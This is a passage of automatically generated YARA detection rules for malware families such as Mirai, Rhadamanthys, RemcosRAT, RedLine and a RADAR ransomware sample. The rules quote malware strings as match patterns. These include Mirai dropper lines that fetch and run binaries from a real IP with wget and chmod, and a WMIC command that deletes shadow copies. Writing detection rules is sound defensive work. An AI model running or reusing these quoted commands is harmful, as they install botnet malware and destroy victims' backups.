      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1258d87d3ab4fd25b34bcc44160aa1112bf2f5652078f3bb224313caa33ca4e0"
   strings:
      $s1 = "4c237c485d6a" ascii /* score: '17.00'*/ /* hex encoded string 'L#|H]j' */
      $s2 = "6a60315c7428" ascii /* score: '17.00'*/ /* hex encoded string 'j`1\t(' */
      $s3 = "7856754a5f3c" ascii /* score: '17.00'*/ /* hex encoded string 'xVuJ_<' */
      $s4 = "597243482e34" ascii /* score: '17.00'*/ /* hex encoded string 'YrCH.4' */
      $s5 = "2c47435f7639" ascii /* score: '17.00'*/ /* hex encoded string ',GC_v9' */
      $s6 = "51633b65675a" ascii /* score: '17.00'*/ /* hex encoded string 'Qc;egZ' */
      $s7 = "4d3c74735631" ascii /* score: '17.00'*/ /* hex encoded string 'M<tsV1' */
      $s8 = "756a746a746a" ascii /* score: '17.00'*/ /* hex encoded string 'ujtjtj' */
      $s9 = "3a4f4a682b39" ascii /* score: '17.00'*/ /* hex encoded string ':OJh+9' */
      $s10 = "4e4a6e625557" ascii /* score: '17.00'*/ /* hex encoded string 'NJnbUW' */
      $s11 = "754e4c666368" ascii /* score: '17.00'*/ /* hex encoded string 'uNLfch' */
      $s12 = "6b3359793077" ascii /* score: '17.00'*/ /* hex encoded string 'k3Yy0w' */
      $s13 = "7b4d43454169" ascii /* score: '17.00'*/ /* hex encoded string '{MCEAi' */
      $s14 = "497e75666e52" ascii /* score: '17.00'*/ /* hex encoded string 'I~ufnR' */
      $s15 = "3833556e3822" ascii /* score: '17.00'*/ /* hex encoded string '83Un8"' */
   condition:
      uint16(0) == 0x5a4d and filesize < 26000KB and
      8 of them
}

rule RustyStealer_signature__b25557f316c563f336766cfbc5e9ece4_imphash_ {
   meta:
      description = "_subset_batch - file RustyStealer(signature)_b25557f316c563f336766cfbc5e9ece4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "53f13751be47c5eed9604599a4bbf013d6707244e5b1d6f846a5b8d3b0afb19e"
   strings:
      $s1 = "fatal runtime error: I/O error: operation failed to complete synchronously" fullword ascii /* score: '18.00'*/
      $s2 = "/rustc/17067e9ac6d7ecb70e50f92c1944e545188d2359\\library\\alloc\\src\\collections\\btree\\node.rsassertion failed: edge.height =" ascii /* score: '17.00'*/
      $s3 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s4 = "assertion failed: edge.height == self.node.height - 1" fullword ascii /* score: '15.00'*/
      $s5 = "Once instance has previously been poisoned" fullword ascii /* score: '14.00'*/
      $s6 = "library\\std\\src\\sync\\poison\\once.rs" fullword ascii /* score: '14.00'*/
      $s7 = "attempt to divide by zero" fullword ascii /* score: '13.00'*/
      $s8 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s9 = "attempted to index str up to maximum usize" fullword ascii /* score: '13.00'*/
      $s10 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s11 = ".height - 1" fullword ascii /* score: '12.00'*/
      $s12 = "SetThreadDescription" fullword ascii /* score: '10.00'*/
      $s13 = "runtime error %d" fullword ascii /* score: '10.00'*/
      $s14 = "user-provided comparison function does not correctly implement a total order" fullword ascii /* score: '10.00'*/
      $s15 = "library\\std\\src\\thread\\mod.rsfailed to generate unique thread ID: bitspace exhausted" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule Mirai_signature__fe6a20bf {
   meta:
      description = "_subset_batch - file Mirai(signature)_fe6a20bf.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fe6a20bfcbd86f7a2e6f1af9844da36b9fef0a2ca052b1bcb8a592b248452ec3"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule PythonStealer_signature__dcaf48c1f10b0efa0a4472200f3850ed_imphash__58451b25 {
   meta:
      description = "_subset_batch - file PythonStealer(signature)_dcaf48c1f10b0efa0a4472200f3850ed(imphash)_58451b25.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "58451b250f085d8663cb5fbf9a9a57cdbef165959d70a0c0d68560b0cee4c1a5"
   strings:
      $s1 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '27.00'*/
      $s2 = "bVCRUNTIME140.dll" fullword ascii /* score: '26.00'*/
      $s3 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*" ascii /* score: '24.00'*/
      $s5 = "bpython313.dll" fullword ascii /* score: '23.00'*/
      $s6 = "9python313.dll" fullword ascii /* score: '23.00'*/
      $s7 = "VCRUNTIME140_1.dll" fullword wide /* score: '23.00'*/
      $s8 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s9 = "LOADER: failed to convert runtime-tmpdir to a wide string." fullword wide /* score: '22.00'*/
      $s10 = "LOADER: failed to expand environment variables in the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s11 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" fullword wide /* score: '22.00'*/
      $s12 = "LOADER: failed to obtain the absolute path of the runtime-tmpdir." fullword wide /* score: '22.00'*/
      $s13 = "LOADER: failed to create runtime-tmpdir path %ls!" fullword wide /* score: '22.00'*/
      $s14 = "blibssl-3.dll" fullword ascii /* score: '20.00'*/
      $s15 = "blibcrypto-3.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 23000KB and
      8 of them
}

rule Rhadamanthys_signature__15ad7db86b6051e69aa3c16e5539c4a5_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_15ad7db86b6051e69aa3c16e5539c4a5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "395a47899328b3f7f26465aa459d9f37ad99f787b531a32793238b490d607a66"
   strings:
      $x1 = "<asmv1:assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv1=\"urn:schemas-microsoft-com:asm.v" ascii /* score: '35.00'*/
      $s2 = "-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></request" ascii /* score: '26.00'*/
      $s3 = ".?AU?$continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application@Systray@Spotlight@Avira@@@boost@@" ascii /* score: '25.00'*/
      $s4 = ".?AU?$continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application@Systray@Spotlight@Avira@@@boost@@" ascii /* score: '25.00'*/
      $s5 = ".?AU?$continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application@Systray@Spotlight@Avira@@@boost@@" ascii /* score: '25.00'*/
      $s6 = ".?AU?$future_deferred_continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application@Systray@Spotlight" ascii /* score: '25.00'*/
      $s7 = ".?AV?$sp_counted_impl_p@U?$future_deferred_continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Applicat" ascii /* score: '25.00'*/
      $s8 = ".?AV?$sp_counted_impl_p@U?$future_deferred_continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Applicat" ascii /* score: '25.00'*/
      $s9 = ".?AV?$thread_data@V?$bind_t@XP6AXV?$shared_ptr@Ushared_state_base@detail@boost@@@boost@@@ZV?$list1@V?$value@V?$shared_ptr@U?$fut" ascii /* score: '25.00'*/
      $s10 = ".?AU?$continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application@Systray@Spotlight@Avira@@@boost@@" ascii /* score: '25.00'*/
      $s11 = ".?AV?$sp_counted_impl_p@U?$future_async_continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application" ascii /* score: '25.00'*/
      $s12 = ".?AV?$sp_counted_impl_p@U?$future_sync_continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application@" ascii /* score: '25.00'*/
      $s13 = ".?AV?$sp_counted_impl_p@U?$future_async_continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application" ascii /* score: '25.00'*/
      $s14 = ".?AU?$future_async_continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application@Systray@Spotlight@Av" ascii /* score: '25.00'*/
      $s15 = ".?AV?$sp_counted_impl_p@U?$future_sync_continuation_shared_state@V?$future@UDefaultResponse@Contracts@Communication@Application@" ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__fed7f0d7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fed7f0d7.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fed7f0d70456cb7e490e3f691aebf6005dfe55aa8513af0799c78985fb11fb6a"
   strings:
      $s1 = "rm -rf mips;/bin/busybox wget http://45.125.66.56/mips; chmod 777 mips; ./mips tvt;" fullword ascii /* score: '27.00'*/
      $s2 = "rm -rf x86;/bin/busybox wget http://45.125.66.56/x86; chmod 777 x86; ./x86 tvt;" fullword ascii /* score: '27.00'*/
      $s3 = "rm -rf ppc;/bin/busybox wget http://45.125.66.56/ppc; chmod 777 ppc; ./ppc tvt;" fullword ascii /* score: '27.00'*/
      $s4 = "rm -rf mpsl;/bin/busybox wget http://45.125.66.56/mpsl; chmod 777 mpsl; ./mpsl tvt;" fullword ascii /* score: '27.00'*/
      $s5 = "rm -rf i686;/bin/busybox wget http://45.125.66.56/i686; chmod 777 i686; ./i686 tvt;" fullword ascii /* score: '27.00'*/
      $s6 = "rm -rf x86_64;/bin/busybox wget http://45.125.66.56/x86_64; chmod 777 x86_64; ./x86_64 tvt;" fullword ascii /* score: '27.00'*/
      $s7 = "rm -rf arm6;/bin/busybox wget http://45.125.66.56/arm6; chmod 777 arm6; ./arm6 tvt;" fullword ascii /* score: '27.00'*/
      $s8 = "rm -rf arm;/bin/busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm tvt;" fullword ascii /* score: '27.00'*/
      $s9 = "rm -rf i486;/bin/busybox wget http://45.125.66.56/i486; chmod 777 i486; ./i486 tvt;" fullword ascii /* score: '27.00'*/
      $s10 = "rm -rf arm5;/bin/busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 tvt;" fullword ascii /* score: '27.00'*/
      $s11 = "rm -rf i586;/bin/busybox wget http://45.125.66.56/i586; chmod 777 i586; ./i586 tvt;" fullword ascii /* score: '27.00'*/
      $s12 = "rm -rf spc;/bin/busybox wget http://45.125.66.56/spc; chmod 777 spc; ./spc tvt;" fullword ascii /* score: '27.00'*/
      $s13 = "rm -rf arm7;/bin/busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 tvt;" fullword ascii /* score: '27.00'*/
      $s14 = "rm -rf sh4;/bin/busybox wget http://45.125.66.56/sh4; chmod 777 sh4; ./sh4 tvt;" fullword ascii /* score: '27.00'*/
      $s15 = "rm -rf mips;wget http://45.125.66.56/mips; chmod 777 mips; ./mips tvt;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 10KB and
      8 of them
}

rule PythonStealer_signature__e669ec4d83bbf79f71f6a0bc9f9c6a7d_imphash_ {
   meta:
      description = "_subset_batch - file PythonStealer(signature)_e669ec4d83bbf79f71f6a0bc9f9c6a7d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8b32a036c778ff1e4d33f0d48e00480553341f7d27bbf23fd9aea77f00dc8721"
   strings:
      $x1 = "<ns0:assembly xmlns:ns0=\"urn:schemas-microsoft-com:asm.v1\" xmlns:ns1=\"urn:schemas-microsoft-com:compatibility.v1\" xmlns:ns2=" ascii /* score: '48.00'*/
      $x2 = "\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df" ascii /* score: '36.00'*/
      $s3 = "zyxwvuts" fullword ascii /* reversed goodware string 'stuvwxyz' */ /* score: '18.00'*/
      $s4 = "twwwwwww" fullword ascii /* reversed goodware string 'wwwwwwwt' */ /* score: '18.00'*/
      $s5 = ":schemas-microsoft-com:asm.v3\" xmlns:ns3=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\" manifestVersion=\"1.0\"><ns0" ascii /* score: '17.00'*/
      $s6 = "Error, couldn't unpack file to target path." fullword ascii /* score: '17.00'*/
      $s7 = "SRQPONMLKJIH" fullword ascii /* reversed goodware string 'HIJKLMNOPQRS' */ /* score: '16.50'*/
      $s8 = "CDDDDDDD" ascii /* reversed goodware string 'DDDDDDDC' */ /* score: '16.50'*/
      $s9 = "e=\"*\" /></ns0:dependentAssembly></ns0:dependency><ns2:trustInfo><ns2:security><ns2:requestedPrivileges><ns2:requestedExecution" ascii /* score: '15.00'*/
      $s10 = "~}|{zyxwvuts" fullword ascii /* reversed goodware string 'stuvwxyz{|}~' */ /* score: '14.00'*/
      $s11 = "GFEDCBA@" fullword ascii /* reversed goodware string '@ABCDEFG' */ /* score: '14.00'*/
      $s12 = "]UUUUUUU" fullword ascii /* reversed goodware string 'UUUUUUU]' */ /* score: '14.00'*/
      $s13 = "~}|{zyxwvutsrqponmlkjihg" fullword ascii /* reversed goodware string 'ghijklmnopqrstuvwxyz{|}~' */ /* score: '14.00'*/
      $s14 = "mblyIdentity type=\"win32\" name=\"Mini\" version=\"1.0.0.0\" /><ns1:compatibility><ns1:application><ns1:supportedOS Id=\"{e2011" ascii /* score: '14.00'*/
      $s15 = "jlnprtvxz|~" fullword ascii /* reversed goodware string '~|zxvtrpnlj' */ /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      1 of ($x*) and 4 of them
}

rule Mydoom_signature__8e3b89212eb788b1b0c947bc3faeb0c9_imphash_ {
   meta:
      description = "_subset_batch - file Mydoom(signature)_8e3b89212eb788b1b0c947bc3faeb0c9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1122d94b08c232d3c391d972805a7fb248988f709ded2daae9aad34f76000aed"
   strings:
      $s1 = "!Win32 .EXE." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule Pony_signature__52a9bf010be2b01c8aee21c91b2a520f_imphash_ {
   meta:
      description = "_subset_batch - file Pony(signature)_52a9bf010be2b01c8aee21c91b2a520f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0380c01d290b6b77769d1494aa19fea1b893446a0048330314a93b695f0ec1dd"
   strings:
      $s1 = "SHELL32.DLL " fullword ascii /* score: '24.00'*/
      $s2 = "Satirising5.exe" fullword wide /* score: '22.00'*/
      $s3 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB" fullword ascii /* score: '13.00'*/
      $s4 = "AShell_NotifyIconW" fullword ascii /* score: '9.00'*/
      $s5 = "!Win32 .EXE." fullword ascii /* score: '8.00'*/
      $s6 = "idrtsforeningerne" fullword ascii /* score: '8.00'*/
      $s7 = "phillip" fullword ascii /* score: '8.00'*/
      $s8 = "pandaric" fullword ascii /* score: '8.00'*/
      $s9 = "fotografierne" fullword ascii /* score: '8.00'*/
      $s10 = "futteralet" fullword ascii /* score: '8.00'*/
      $s11 = "tegningsretters" fullword ascii /* score: '8.00'*/
      $s12 = "indleverede" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule NanoCore_signature_ {
   meta:
      description = "_subset_batch - file NanoCore(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2670da8108ab05a3c8d7c931e7bb9b1c809c6d2ace42b57963e8e78261008f10"
   strings:
      $s1 = "depens/posh.dll" fullword ascii /* score: '20.00'*/
      $s2 = "depens/adfw.dll" fullword ascii /* score: '20.00'*/
      $s3 = "depens/cnli-1.dll" fullword ascii /* score: '20.00'*/
      $s4 = "depens/pcla-0.dll" fullword ascii /* score: '20.00'*/
      $s5 = "depens/pcreposix-0.dll" fullword ascii /* score: '20.00'*/
      $s6 = "depens/riar-2.dll" fullword ascii /* score: '20.00'*/
      $s7 = "depens/tucl-1.dll" fullword ascii /* score: '20.00'*/
      $s8 = "depens/tibe.dll" fullword ascii /* score: '20.00'*/
      $s9 = "depens/xdvl-0.dll" fullword ascii /* score: '20.00'*/
      $s10 = "depens/tibe-2.dll" fullword ascii /* score: '20.00'*/
      $s11 = "depens/tucl.dll" fullword ascii /* score: '20.00'*/
      $s12 = "depens/ucl.dll" fullword ascii /* score: '20.00'*/
      $s13 = "depens/trch-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "depens/libxml2.dll" fullword ascii /* score: '20.00'*/
      $s15 = "depens/pcrecpp-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 10000KB and
      8 of them
}

rule RemcosRAT_signature_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f8e7f10365e3f78832b2c9d2943f773ac5e49beb1023c27b50e2fa4c327d708f"
   strings:
      $s1 = " September 2025/Qt5Widgets.dll" fullword ascii /* score: '25.00'*/
      $s2 = " September 2025/VCRUNTIME140.dll" fullword ascii /* score: '23.00'*/
      $s3 = " September 2025/Qt5Core.dll" fullword ascii /* score: '20.00'*/
      $s4 = " September 2025/Qt5Network.dll" fullword ascii /* score: '20.00'*/
      $s5 = " September 2025/Qt5Gui.dll" fullword ascii /* score: '20.00'*/
      $s6 = " September 2025/MSVCP140.dll" fullword ascii /* score: '20.00'*/
      $s7 = " September 2025.pdf.exe" fullword ascii /* score: '19.00'*/
      $s8 = "GVDVFVEVG" fullword ascii /* base64 encoded string 'T5ETEF' */ /* score: '16.50'*/
      $s9 = "GNDNFNENG" fullword ascii /* base64 encoded string '43E4CF' */ /* score: '16.50'*/
      $s10 = "gggkkk" fullword ascii /* reversed goodware string 'kkkggg' */ /* score: '15.00'*/
      $s11 = "1VHFRa1Fd" fullword ascii /* base64 encoded string 'TqQkQ]' */ /* score: '14.00'*/
      $s12 = "IlNlIlMlKlO" fullword ascii /* base64 encoded string '"Se"S%*S' */ /* score: '14.00'*/
      $s13 = "YhVZ.mbt" fullword ascii /* score: '10.00'*/
      $s14 = "`rp~pQpipEpUpmpCpsp[pWp_" fullword ascii /* score: '10.00'*/
      $s15 = "* CPo&+2" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 29000KB and
      8 of them
}

rule RedLineStealer_signature__21371b611d91188d602926b15db6bd48_imphash_ {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_21371b611d91188d602926b15db6bd48(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "138e9d468f0f52509eb3c66fbe1a0a92c53ae8e191ad04bca76715e711979615"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = " publicKeyToken=\"6595b64144ccf1df\"/>" fullword ascii /* score: '13.00'*/
      $s3 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s4 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s5 = "+s>_- -J& " fullword ascii /* score: '9.00'*/
      $s6 = "vrrxwvov" fullword ascii /* score: '8.00'*/
      $s7 = "psspucw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Rhadamanthys_signature__5597d6cdf39b071da11fc7d421225b24_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5597d6cdf39b071da11fc7d421225b24(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dc6ea6ddf94fde7eb62aebc7d121d5ac7a7167a334cbe83d639f5a9b16621511"
   strings:
      $x1 = "jscript.dll" fullword ascii /* reversed goodware string 'lld.tpircsj' */ /* score: '39.00'*/
      $x2 = "BvDump32.exe" fullword wide /* score: '32.00'*/
      $s3 = "ConhostV2.dll" fullword wide /* score: '28.00'*/
      $s4 = "Unable to find conhost.exe process." fullword wide /* score: '27.00'*/
      $s5 = "Error decoding data size of m_targetHost in QtSshTunnelResponderPortsReply::Decode()" fullword wide /* score: '27.00'*/
      $s6 = "Error decoding m_targetHost in QtSshTunnelResponderPortsReply::Decode()" fullword wide /* score: '27.00'*/
      $s7 = "Unrecognized quantum type ID decoded for m_content in QtAuthAgentPacket::Decode()" fullword wide /* score: '26.00'*/
      $s8 = "Error encoding m_targetHost in QtSshTunnelResponderPortsReply::Encode()" fullword wide /* score: '25.00'*/
      $s9 = "Error encoding WORD32_MAX size for m_targetHost in QtSshTunnelResponderPortsReply::Encode()" fullword wide /* score: '25.00'*/
      $s10 = "Error decoding data size of m_targetHost in QtConnectProxySuccess::Decode()" fullword wide /* score: '24.00'*/
      $s11 = "Error decoding m_targetHost in QtConnectProxySuccess::Decode()" fullword wide /* score: '24.00'*/
      $s12 = "Error decoding m_originHost in QtSshTunnelResponderTarget::Decode()" fullword wide /* score: '24.00'*/
      $s13 = "Error decoding data size of m_originHost in QtSshTunnelResponderTarget::Decode()" fullword wide /* score: '24.00'*/
      $s14 = "Error decoding data size of m_tunnelHost in QtSshTunnelResponderTarget::Decode()" fullword wide /* score: '24.00'*/
      $s15 = "Error decoding m_tunnelHost in QtSshTunnelResponderTarget::Decode()" fullword wide /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      1 of ($x*) and 4 of them
}

rule RADAR_signature__3ce36202271a0882364dc746469bac29_imphash_ {
   meta:
      description = "_subset_batch - file RADAR(signature)_3ce36202271a0882364dc746469bac29(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d1ac11cf8a615c0b2d94564d20fe108f7d63f9b36723dc81328ef734a4401f53"
   strings:
      $x1 = "cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \"ID='%s'\" delete" fullword wide /* score: '48.00'*/
      $x2 = "backupexecmanagementservice.exe" fullword wide /* score: '33.00'*/
      $s3 = "postgres.exe" fullword wide /* score: '27.00'*/
      $s4 = "avagent.exe" fullword wide /* score: '27.00'*/
      $s5 = "veeam.endpoint.service.exe" fullword wide /* score: '25.00'*/
      $s6 = "veeam.backup.agent.configurationservice.exe<" fullword wide /* score: '25.00'*/
      $s7 = "sqbcoreservice.exe" fullword wide /* score: '25.00'*/
      $s8 = "tbirdconfig.exe" fullword wide /* score: '25.00'*/
      $s9 = "beremote.exe" fullword wide /* score: '25.00'*/
      $s10 = "CMDLINE: Unknown argument #%d - %s" fullword wide /* score: '23.00'*/
      $s11 = "Link: https://www.redhotcyber.com/en/post/rhc-interviews-radar-and-dispossessor-when-it-comes-to-security-the-best-defense-is-a-" ascii /* score: '22.00'*/
      $s12 = "Link: https://www.redhotcyber.com/en/post/rhc-interviews-radar-and-dispossessor-when-it-comes-to-security-the-best-defense-is-a-" ascii /* score: '22.00'*/
      $s13 = "shellcode" fullword wide /* score: '22.00'*/
      $s14 = "visios.exe" fullword wide /* score: '22.00'*/
      $s15 = "isqlplussvc.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__94eef47f5cccd8f1a5335a319d43d815_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_94eef47f5cccd8f1a5335a319d43d815(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "919bc08a36f97c1de97e36bde2a421a529f9ea7b3c4d5b3ef20caac888521f3d"
   strings:
      $s1 = "Microsoft.WITDataStore32.dll" fullword wide /* score: '23.00'*/
      $s2 = "D:\\a\\_work\\1\\bin\\Release.Win32\\Tfs.ExtendedClient\\Microsoft.WITDataStore32.pdb" fullword ascii /* score: '22.00'*/
      $s3 = ".?AV?$CComObject@VCPsCookieLookupFieldUsageMetadata@@@ATL@@" fullword ascii /* score: '18.00'*/
      $s4 = ".?AV?$CComObject@VCPsLookupFieldUsageParentChildMetadata@@@ATL@@" fullword ascii /* score: '15.00'*/
      $s5 = ".?AV?$CPsMemoryStcComObject@VCPsLookupFieldUsageParentChildMetadata@@@@" fullword ascii /* score: '15.00'*/
      $s6 = ".?AVCPsCookieLookupFieldUsageMetadata@@" fullword ascii /* score: '15.00'*/
      $s7 = ".?AV?$CPsCookieLookupMetadata@VCPsCookieLookupFieldUsageMetadata@@UIPsCookieLookupFieldUsageMetadata@@UPsFieldUsageMetadataRecor" ascii /* score: '15.00'*/
      $s8 = ".?AV?$CPsCookieLookupMetadata@VCPsCookieLookupFieldUsageMetadata@@UIPsCookieLookupFieldUsageMetadata@@UPsFieldUsageMetadataRecor" ascii /* score: '15.00'*/
      $s9 = ".?AV?$CComObject@VCPsLookupWorkItemTypeFieldUsageWorkItemTypeMetadata@@@ATL@@" fullword ascii /* score: '15.00'*/
      $s10 = ".?AV?$CPsMemoryStcComObject@VCPsLookupWorkItemTypeFieldUsageWorkItemTypeMetadata@@@@" fullword ascii /* score: '15.00'*/
      $s11 = ".?AUIPsCookieLookupFieldUsageMetadata@@" fullword ascii /* score: '15.00'*/
      $s12 = ".?AV?$CComObject@VCPsLookupFieldUsageChildParentMetadata@@@ATL@@" fullword ascii /* score: '15.00'*/
      $s13 = ".?AV?$CPsMemoryStcComObject@VCPsLookupFieldUsageChildMetadata@@@@" fullword ascii /* score: '15.00'*/
      $s14 = ".?AV?$CComObject@VCPsLookupFieldUsageChildMetadata@@@ATL@@" fullword ascii /* score: '15.00'*/
      $s15 = ".?AV?$CPsMemoryStcComObject@VCPsLookupFieldUsageChildParentMetadata@@@@" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Rhadamanthys_signature__f6baa5eaa8231d4fe8e922a2e6d240ea_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_f6baa5eaa8231d4fe8e922a2e6d240ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8f835c53d895e51a8f3133cdf43072e14430add8bf977ce9f5d687fb70e9c5ed"
   strings:
      $x1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '32.00'*/
      $s2 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" pu" ascii /* score: '29.00'*/
      $s3 = "RunProgram=\"%%P:hidcon:\\\"main.bat\\\" /S\"" fullword ascii /* score: '24.00'*/
      $s4 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s5 = "<requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivil" ascii /* score: '23.00'*/
      $s6 = "sfxelevation" fullword wide /* score: '20.00'*/
      $s7 = "PreExtract=\"%%P:hidcon:cmd /c \\\"\\\"%%T\\\\KillDuplicate.cmd\\\" \\\"%%T\\\" \\\"%%M\\\"\\\"\"" fullword ascii /* score: '16.00'*/
      $s8 = "YC.exe" fullword wide /* score: '16.00'*/
      $s9 = "InstallPath=\"%Temp%\\\\main\"" fullword ascii /* score: '15.00'*/
      $s10 = "Error in command line:" fullword ascii /* score: '15.00'*/
      $s11 = "SFX module - Copyright (c) 2005-2012 Oleg Scherbakov" fullword ascii /* score: '14.00'*/
      $s12 = " 7-Zip - Copyright (c) 1999-2011 " fullword ascii /* score: '14.00'*/
      $s13 = "7-Zip archiver - Copyright (c) 1999-2011 Igor Pavlov" fullword ascii /* score: '14.00'*/
      $s14 = " - Copyright (c) 2005-2012 " fullword ascii /* score: '14.00'*/
      $s15 = "7zSfxVarSystemPlatform" fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__0293eec0b5432ad092f24065016203b2_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_0293eec0b5432ad092f24065016203b2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e4b394710171888c98115ff1cc8639992a746c3313363565ca8f54b237fc4ec2"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
